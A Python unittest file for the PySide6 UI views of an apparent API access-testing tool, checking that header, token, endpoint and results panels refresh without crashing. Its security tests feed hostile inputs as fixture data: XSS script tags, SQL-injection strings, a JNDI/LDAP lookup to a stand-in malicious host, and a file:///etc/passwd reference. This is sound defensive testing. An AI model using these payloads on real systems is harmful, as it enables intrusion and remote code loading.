"""
Test suite for UI views
"""

import unittest
import unittest.mock
import sys
from unittest.mock import patch, MagicMock

# Mock PySide6 before importing any UI modules
mock_pyside6 = MagicMock()
mock_pyside6.QtCore = MagicMock()
mock_pyside6.QtGui = MagicMock()  
mock_pyside6.QtWidgets = MagicMock()

sys.modules['PySide6'] = mock_pyside6
sys.modules['PySide6.QtCore'] = mock_pyside6.QtCore
sys.modules['PySide6.QtGui'] = mock_pyside6.QtGui
sys.modules['PySide6.QtWidgets'] = mock_pyside6.QtWidgets

# Add the parent directory to the path so we can import our modules
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


class TestTheme(unittest.TestCase):
    """Test Theme module"""
    
    def test_theme_constants(self):
        """Test that theme constants are defined"""
        from UI.views.Theme import primary, secondary, background, text, border
        
        # Should be string color values
        self.assertIsInstance(primary, str)
        self.assertIsInstance(secondary, str) 
        self.assertIsInstance(background, str)
        self.assertIsInstance(text, str)
        self.assertIsInstance(border, str)
        
        # Should start with # for hex colors
        for color in [primary, secondary, background, text, border]:
            self.assertTrue(color.startswith('#') or color in ['white', 'black'])


class TestHeadersSection(unittest.TestCase):
    """Test HeadersSection view"""
    
    def setUp(self):
        # Mock Qt widgets
        with patch('UI.views.Headers.QtWidgets.QWidget'), \
             patch('UI.views.Headers.QtWidgets.QVBoxLayout'), \
             patch('UI.views.Headers.QtWidgets.QHBoxLayout'), \
             patch('UI.views.Headers.QtWidgets.QTableWidget'), \
             patch('UI.views.Headers.QtWidgets.QPushButton'), \
             patch('UI.views.Headers.QtWidgets.QHeaderView'):
            from UI.views.Headers import HeadersSection
            mock_store = MagicMock()
            self.headers = HeadersSection(mock_store)
    
    def test_headers_section_init(self):
        """Test HeadersSection initialization"""
        self.assertIsNotNone(self.headers)
        self.assertIsNotNone(self.headers.store)
    
    def test_headers_section_refresh(self):
        """Test headers refresh functionality"""
        # Mock store data
        self.headers.store.spec = {
            "default_headers": {
                "Accept": "application/json",
                "Content-Type": "application/json"
            }
        }
        
        # Mock table
        self.headers.table = MagicMock()
        
        # Should not crash when refreshing
        try:
            self.headers.refresh()
        except Exception as e:
            self.fail(f"Headers refresh failed: {e}")


class TestTokensSection(unittest.TestCase):
    """Test TokensSection view"""
    
    def setUp(self):
        # Mock Qt widgets
        with patch('UI.views.Tokens.QtWidgets.QWidget'), \
             patch('UI.views.Tokens.QtWidgets.QVBoxLayout'), \
             patch('UI.views.Tokens.QtWidgets.QHBoxLayout'), \
             patch('UI.views.Tokens.QtWidgets.QTableWidget'), \
             patch('UI.views.Tokens.QtWidgets.QPushButton'), \
             patch('UI.views.Tokens.QtWidgets.QHeaderView'):
            from UI.views.Tokens import TokensSection
            mock_store = MagicMock()
            self.tokens = TokensSection(mock_store)
    
    def test_tokens_section_init(self):
        """Test TokensSection initialization"""
        self.assertIsNotNone(self.tokens)
        self.assertIsNotNone(self.tokens.store)
    
    def test_tokens_section_refresh(self):
        """Test tokens refresh functionality"""
        # Mock store data
        self.tokens.store.spec = {
            "roles": {
                "guest": {"auth": {"type": "none"}},
                "admin": {"auth": {"type": "bearer", "token": "admin-token"}}
            }
        }
        
        # Mock table
        self.tokens.table = MagicMock()
        
        # Should not crash when refreshing
        try:
            self.tokens.refresh()
        except Exception as e:
            self.fail(f"Tokens refresh failed: {e}")


class TestEndpointsSection(unittest.TestCase):
    """Test EndpointsSection view"""
    
    def setUp(self):
        # Mock Qt widgets extensively for EndpointsSection
        qt_widgets = [
            'QWidget', 'QVBoxLayout', 'QHBoxLayout', 'QSplitter', 'QTextEdit',
            'QPushButton', 'QTableWidget', 'QTableWidgetItem', 'QHeaderView',
            'QAbstractItemView', 'QComboBox', 'QLineEdit', 'QLabel'
        ]
        
        self.qt_patches = {}
        for widget in qt_widgets:
            patch_path = f'UI.views.Endpoints.QtWidgets.{widget}'
            patcher = patch(patch_path)
            self.qt_patches[widget] = patcher
            setattr(self, f'mock_{widget.lower()}', patcher.start())
            self.addCleanup(patcher.stop)
        
        # Mock QtCore
        with patch('UI.views.Endpoints.QtCore.Qt'):
            from UI.views.Endpoints import EndpointsSection
            mock_store = MagicMock()
            self.endpoints = EndpointsSection(mock_store)
    
    def test_endpoints_section_init(self):
        """Test EndpointsSection initialization"""
        self.assertIsNotNone(self.endpoints)
        self.assertIsNotNone(self.endpoints.store)
    
    def test_endpoints_section_refresh(self):
        """Test endpoints refresh functionality"""
        # Mock store data
        self.endpoints.store.spec = {
            "endpoints": [
                {"name": "Get Users", "method": "GET", "path": "/users", "expect": {}},
                {"name": "Create User", "method": "POST", "path": "/users", "expect": {}}
            ],
            "roles": {
                "guest": {"auth": {"type": "none"}},
                "admin": {"auth": {"type": "bearer", "token": "token"}}
            }
        }
        
        # Mock table
        self.endpoints.endpoints_table = MagicMock()
        self.endpoints.matrix_table = MagicMock()
        
        # Should not crash when refreshing
        try:
            self.endpoints.refresh()
        except Exception as e:
            self.fail(f"Endpoints refresh failed: {e}")
    
    def test_endpoints_section_parse_bulk_text(self):
        """Test bulk text parsing in endpoints"""
        # Mock the bulk text widget
        self.endpoints.bulk_text = MagicMock()
        self.endpoints.bulk_text.toPlainText.return_value = """
        GET /users List all users
        POST /users Create user
        /admin Admin dashboard
        """
        
        # Mock store parse method
        self.endpoints.store.parse_endpoints_text.return_value = [
            ("List all users", "GET", "/users"),
            ("Create user", "POST", "/users"), 
            ("Admin dashboard", "GET", "/admin")
        ]
        
        # Should handle bulk parsing
        try:
            self.endpoints._parse_bulk()
        except Exception as e:
            self.fail(f"Bulk parsing failed: {e}")


class TestResultsSection(unittest.TestCase):
    """Test ResultsSection view"""
    
    def setUp(self):
        # Mock Qt widgets
        with patch('UI.views.Results.QtWidgets.QWidget'), \
             patch('UI.views.Results.QtWidgets.QVBoxLayout'), \
             patch('UI.views.Results.QtWidgets.QTextEdit'):
            from UI.views.Results import ResultsSection
            self.results = ResultsSection()
    
    def test_results_section_init(self):
        """Test ResultsSection initialization"""
        self.assertIsNotNone(self.results)
    
    def test_results_section_render(self):
        """Test results rendering"""
        # Mock the text widget
        self.results.text = MagicMock()
        
        test_results = {
            "GET /users": {
                "guest": {"status": "FAIL", "http": 403},
                "admin": {"status": "PASS", "http": 200, "latency_ms": 150}
            },
            "POST /admin": {
                "guest": {"status": "FAIL", "http": 403},
                "admin": {"status": "PASS", "http": 201}
            }
        }
        
        # Should not crash when rendering
        try:
            self.results.render(test_results)
        except Exception as e:
            self.fail(f"Results rendering failed: {e}")
    
    def test_results_section_render_empty(self):
        """Test results rendering with empty results"""
        self.results.text = MagicMock()
        
        # Should handle empty results
        try:
            self.results.render({})
        except Exception as e:
            self.fail(f"Empty results rendering failed: {e}")
    
    def test_results_section_render_none(self):
        """Test results rendering with None"""
        self.results.text = MagicMock()
        
        # Should handle None results
        try:
            self.results.render(None)
        except Exception as e:
            self.fail(f"None results rendering failed: {e}")


class TestViewsSecurityAndEdgeCases(unittest.TestCase):
    """Test views with security considerations and edge cases"""
    
    def setUp(self):
        # Mock Qt components for all views
        qt_widgets = [
            'QWidget', 'QVBoxLayout', 'QHBoxLayout', 'QTableWidget', 
            'QPushButton', 'QTextEdit', 'QHeaderView', 'QTableWidgetItem',
            'QComboBox', 'QLineEdit', 'QLabel', 'QSplitter'
        ]
        
        self.qt_patches = {}
        for widget in qt_widgets:
            for view in ['Headers', 'Tokens', 'Endpoints', 'Results']:
                patch_path = f'UI.views.{view}.QtWidgets.{widget}'
                patcher = patch(patch_path)
                self.qt_patches[f'{view}_{widget}'] = patcher
                setattr(self, f'mock_{view.lower()}_{widget.lower()}', patcher.start())
                self.addCleanup(patcher.stop)
        
        # Mock QtCore for endpoints
        with patch('UI.views.Endpoints.QtCore.Qt'):
            pass
    
    def test_headers_with_malicious_content(self):
        """Test HeadersSection with malicious header content"""
        from UI.views.Headers import HeadersSection
        
        mock_store = MagicMock()
        mock_store.spec = {
            "default_headers": {
                "<script>alert('xss')</script>": "malicious_value",
                "'; DROP TABLE headers; --": "sql_injection",
                "Authorization": "Bearer ${jndi:ldap://malicious.com/}",
                "X-Large-Header": "A" * 100000  # Very large header
            }
        }
        
        headers = HeadersSection(mock_store)
        headers.table = MagicMock()
        
        # Should handle malicious content without crashing
        try:
            headers.refresh()
        except Exception as e:
            self.fail(f"Headers section crashed with malicious content: {e}")
    
    def test_tokens_with_malicious_content(self):
        """Test TokensSection with malicious token content"""
        from UI.views.Tokens import TokensSection
        
        mock_store = MagicMock()
        mock_store.spec = {
            "roles": {
                "<script>": {"auth": {"type": "bearer", "token": "alert('xss')"}},
                "'; DROP TABLE roles; --": {"auth": {"type": "none"}},
                "unicode_role_测试": {"auth": {"type": "bearer", "token": "🔑💀"}},
                "large_token_role": {"auth": {"type": "bearer", "token": "T" * 50000}}
            }
        }
        
        tokens = TokensSection(mock_store)
        tokens.table = MagicMock()
        
        # Should handle malicious content without crashing
        try:
            tokens.refresh()
        except Exception as e:
            self.fail(f"Tokens section crashed with malicious content: {e}")
    
    def test_endpoints_with_malicious_content(self):
        """Test EndpointsSection with malicious endpoint content"""
        from UI.views.Endpoints import EndpointsSection
        
        mock_store = MagicMock()
        mock_store.spec = {
            "endpoints": [
                {
                    "name": "<script>alert('xss')</script>", 
                    "method": "GET", 
                    "path": "/malicious",
                    "expect": {"admin": {"status": 200}}
                },
                {
                    "name": "'; DROP TABLE endpoints; --",
                    "method": "POST",
                    "path": "/sql-injection", 
                    "expect": {}
                },
                {
                    "name": "Unicode Test 测试 🔒",
                    "method": "PUT",
                    "path": "/unicode/测试",
                    "expect": {"user": {"status": [200, 201]}}
                },
                {
                    "name": "Very Long Name " + "A" * 1000,
                    "method": "DELETE",
                    "path": "/long-name",
                    "expect": {}
                }
            ],
            "roles": {
                "admin": {"auth": {"type": "bearer", "token": "token"}},
                "user": {"auth": {"type": "none"}}
            }
        }
        
        mock_store.parse_endpoints_text.return_value = []
        
        endpoints = EndpointsSection(mock_store)
        endpoints.endpoints_table = MagicMock()
        endpoints.matrix_table = MagicMock()
        endpoints.bulk_text = MagicMock()
        endpoints.bulk_text.toPlainText.return_value = ""
        
        # Should handle malicious content without crashing
        try:
            endpoints.refresh()
        except Exception as e:
            self.fail(f"Endpoints section crashed with malicious content: {e}")
    
    def test_results_with_complex_data(self):
        """Test ResultsSection with complex result data"""
        from UI.views.Results import ResultsSection
        
        results = ResultsSection()
        results.text = MagicMock()
        
        complex_results = {
            "Endpoint with Unicode 测试": {
                "Role with Symbols 🔒": {
                    "status": "PASS",
                    "http": 200,
                    "latency_ms": 150,
                    "large_response": "X" * 10000
                },
                "'; DROP TABLE results; --": {
                    "status": "FAIL", 
                    "http": 403,
                    "error": "SQL injection attempt in role name"
                }
            },
            "Very Long Endpoint Name " + "E" * 500: {
                "guest": {"status": "SKIP"},
                "admin": {
                    "status": "PASS",
                    "http": 201,
                    "response_data": {"nested": {"deep": {"data": "value"}}}
                }
            }
        }
        
        # Should handle complex data without crashing
        try:
            results.render(complex_results)
        except Exception as e:
            self.fail(f"Results section crashed with complex data: {e}")
    
    def test_endpoints_bulk_parse_malicious_input(self):
        """Test endpoints bulk parsing with malicious input"""
        from UI.views.Endpoints import EndpointsSection
        
        mock_store = MagicMock()
        mock_store.spec = {"endpoints": [], "roles": {}}
        
        endpoints = EndpointsSection(mock_store)
        endpoints.bulk_text = MagicMock()
        endpoints.endpoints_table = MagicMock()
        endpoints.matrix_table = MagicMock()
        
        # Test various malicious bulk inputs
        malicious_inputs = [
            "<script>alert('xss')</script>\nGET /test",
            "'; DROP TABLE endpoints; --\nPOST /malicious",
            "GET /test\n" + "A" * 100000,  # Very large input
            "GET /unicode/测试\nPOST /émojis/🔒\nPUT /symbols/☠️",
            "file:///etc/passwd\nhttp://malicious.com/evil",
            "${jndi:ldap://malicious.com/}\nGET /injection"
        ]
        
        for malicious_input in malicious_inputs:
            endpoints.bulk_text.toPlainText.return_value = malicious_input
            mock_store.parse_endpoints_text.return_value = [
                ("Test", "GET", "/test")
            ]
            
            # Should handle malicious input without crashing
            try:
                endpoints._parse_bulk()
            except Exception as e:
                self.fail(f"Bulk parsing crashed with input '{malicious_input}': {e}")
    
    def test_views_with_memory_intensive_data(self):
        """Test views with memory-intensive data"""
        from UI.views.Headers import HeadersSection
        from UI.views.Tokens import TokensSection
        from UI.views.Results import ResultsSection
        
        # Create large datasets
        large_headers = {f"Header-{i}": f"Value-{i}" * 1000 for i in range(100)}
        large_roles = {f"role_{i}": {"auth": {"type": "bearer", "token": f"token_{i}" * 100}} for i in range(100)}
        large_results = {
            f"endpoint_{i}": {
                f"role_{j}": {
                    "status": "PASS",
                    "http": 200,
                    "large_data": "X" * 1000
                } for j in range(10)
            } for i in range(100)
        }
        
        # Test headers with large data
        mock_store = MagicMock()
        mock_store.spec = {"default_headers": large_headers}
        headers = HeadersSection(mock_store)
        headers.table = MagicMock()
        
        try:
            headers.refresh()
        except Exception as e:
            self.fail(f"Headers crashed with large data: {e}")
        
        # Test tokens with large data
        mock_store.spec = {"roles": large_roles}
        tokens = TokensSection(mock_store)
        tokens.table = MagicMock()
        
        try:
            tokens.refresh()
        except Exception as e:
            self.fail(f"Tokens crashed with large data: {e}")
        
        # Test results with large data
        results = ResultsSection()
        results.text = MagicMock()
        
        try:
            results.render(large_results)
        except Exception as e:
            self.fail(f"Results crashed with large data: {e}")


if __name__ == "__main__":
    unittest.main()